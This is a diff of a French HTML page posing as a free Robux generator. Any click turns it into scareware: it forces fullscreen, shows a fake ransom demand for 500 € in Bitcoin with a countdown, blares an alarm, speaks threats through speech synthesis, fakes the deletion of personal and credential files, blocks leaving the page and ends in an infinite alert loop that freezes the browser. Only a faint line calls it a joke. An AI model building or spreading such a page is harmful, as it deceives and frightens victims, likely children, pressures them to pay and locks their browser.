@@ -3,76 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE ROBUX GENERATOR 2026</title>
+    <title>GÉNÉRATEUR ROBUX GRATUIT</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', sans-serif; text-align: center; margin: 0; overflow: hidden; }
-        .btn-claim { background: #2ecc71; color: white; border: none; padding: 20px 40px; font-size: 1.5em; cursor: pointer; margin-top: 20%; border-radius: 50px; box-shadow: 0 0 20px #2ecc71; }
-        #crash-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0000aa; color: white; padding: 50px; text-align: left; font-family: sans-serif; z-index: 9999; }
-        .glitch { animation: shake 0.1s infinite; color: red; }
-        @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -3px); } 100% { transform: translate(0, 0); } }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        #ui { padding-top: 20%; }
+        .btn { background: #ff9900; color: white; border: none; padding: 25px 50px; font-size: 1.8em; cursor: pointer; border-radius: 10px; font-weight: bold; box-shadow: 0 0 30px #ff9900; }
+        
+        /* Écran de Rançon */
+        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #990000; color: white; z-index: 99999; padding: 40px; box-sizing: border-box; }
+        .file-delete { color: #ffcc00; font-size: 0.9em; text-align: left; }
+        .timer { font-size: 3em; font-weight: bold; color: black; background: white; display: inline-block; padding: 10px; margin: 20px; }
+        .glitch-red { animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(5px, 5px); } 50% { transform: translate(-5px, -5px); } }
     </style>
 </head>
-<body>
+<body onclick="launchChaos()">
 
     <div id="ui">
-        <h1>💎 10,000 ROBUX GRATUITS 💎</h1>
-        <p>Offre limitée pour les joueurs de 2026</p>
-        <button class="btn-claim" onclick="launchChaos()">RÉCLAMER MAINTENANT</button>
+        <h1 style="font-size: 3em;">🎁 CADEAU ROBLOX 🎁</h1>
+        <p>Cliquez pour générer 50 000 Robux sur votre compte</p>
+        <button class="btn">RÉCLAMER LES ROBUX</button>
     </div>
 
-    <div id="crash-screen">
-        <h1>:(</h1>
-        <h2>Votre PC/Mobile a rencontré un problème et doit redémarrer.</h2>
-        <p>Code d'erreur : CRITICAL_PROCESS_DIED_BY_EDIA</p>
-        <p>Suppression de C:/Users/Documents... 45%</p>
-        <p>Envoi des données privées vers le DarkWeb... TERMINE</p>
-        <div id="fake-windows"></div>
+    <div id="ransom-screen" class="glitch-red">
+        <h1 style="font-size: 3.5em; margin: 0;">⚠️ VOS FICHIERS SONT CHIFFRÉS ⚠️</h1>
+        <hr>
+        <div style="display: flex; justify-content: space-between; text-align: left;">
+            <div style="width: 60%;">
+                <p><b>Que s'est-il passé ?</b> Votre appareil a été infecté par le protocole EDIA-BLOCKER. Vos photos, documents et mots de passe ont été envoyés sur nos serveurs et supprimés de votre mémoire locale.</p>
+                <div id="delete-log" class="file-delete"></div>
+            </div>
+            <div style="width: 35%; text-align: center; border: 4px solid black; padding: 10px;">
+                <h3>MONTANT DE LA RANÇON</h3>
+                <h2 style="font-size: 3em;">500 €</h2>
+                <p>En Bitcoin (BTC) uniquement.</p>
+                <p>Temps restant avant suppression totale :</p>
+                <div class="timer">23:59:59</div>
+                <button style="background: white; border: none; padding: 10px; font-weight: bold;">PAYER MAINTENANT</button>
+            </div>
+        </div>
+        <p style="margin-top: 50px; font-size: 0.8em; opacity: 0.5;">(C'est une blague ! Actualise la page pour tout arrêter.)</p>
     </div>
+
+    <audio id="alarm" src="https://www.soundjay.com/buttons/sounds/beep-04.mp3" loop></audio>
 
     <script>
         function launchChaos() {
-            // 1. Passage en plein écran
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            // 2. Cacher l'interface et montrer le crash
-            document.getElementById('ui').style.display = 'none';
-            document.getElementById('crash-screen').style.display = 'block';
-            document.body.classList.add('glitch');
-
-            // 3. La Voix Off (Synthèse vocale)
-            let msg = new SpeechSynthesisUtterance("Alerte. Virus détecté. Suppression de tous vos fichiers personnels en cours. Ne tentez pas d'éteindre l'appareil.");
-            msg.lang = 'fr-FR';
-            msg.pitch = 0.1; // Voix de démon
-            msg.rate = 0.8;
-            window.speechSynthesis.speak(msg);
-
-            // 4. Surchauffe (Vibration x Alertes infinies)
-            if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000, 500]);
+            // 1. Bloquer en Plein Écran
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
             
-            // 5. Simulation "Ouverture x100"
-            for(let i = 0; i < 50; i++) {
-                setTimeout(() => {
-                    let win = document.createElement('div');
-                    win.style.position = 'absolute';
-                    win.style.top = Math.random() * 80 + '%';
-                    win.style.left = Math.random() * 80 + '%';
-                    win.style.width = '300px';
-                    win.style.height = '200px';
-                    win.style.background = '#ccc';
-                    win.style.border = '2px solid black';
-                    win.style.padding = '10px';
-                    win.style.color = 'black';
-                    win.style.zIndex = i;
-                    win.innerHTML = "<b>⚠️ ERROR 0x800" + i + "</b><br>Fichier corrompu détecté !";
-                    document.getElementById('fake-windows').appendChild(win);
-                }, i * 100);
-            }
+            // Tenter de bloquer la sortie (marche sur certains navigateurs)
+            window.onbeforeunload = function() { return "Voulez-vous vraiment perdre vos fichiers ?"; };
 
-            // 6. Le cri final et le freeze
+            // 2. Afficher la Rançon
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('ransom-screen').style.display = 'block';
+
+            // 3. Activer le Son à fond
+            const alarm = document.getElementById('alarm');
+            alarm.volume = 1.0;
+            alarm.play();
+
+            // 4. Voix off flippante
+            let speech = new SpeechSynthesisUtterance("Attention. Une intrusion majeure a été détectée. Vos fichiers sont en cours de suppression. Versement de 500 euros requis immédiatement.");
+            speech.lang = 'fr-FR';
+            speech.rate = 0.9;
+            window.speechSynthesis.speak(speech);
+
+            // 5. Simulation de suppression de fichiers
+            const files = ["Photos/Vacances_2024.jpg", "Documents/MotsDePasse.txt", "Discord/Token_Login.dat", "System/Boot_Sector.bin", "WhatsApp/Backups.crypt"];
+            let logDiv = document.getElementById('delete-log');
+            
+            files.forEach((file, index) => {
+                setTimeout(() => {
+                    logDiv.innerHTML += `<br>❌ SUPPRESSION : ${file} ... OK`;
+                    if (navigator.vibrate) navigator.vibrate(200);
+                }, index * 1500);
+            });
+
+            // 6. Alerte infinie à la fin
             setTimeout(() => {
-                alert("CRITICAL ERROR: MOTHERBOARD OVERHEATING!");
-                while(true) {} // Freeze le navigateur
-            }, 8000);
+                while(true) {
+                    alert("ERREUR CRITIQUE : PAYEZ 500€ POUR DÉBLOQUER");
+                }
+            }, 10000);
         }
     </script>
 </body>
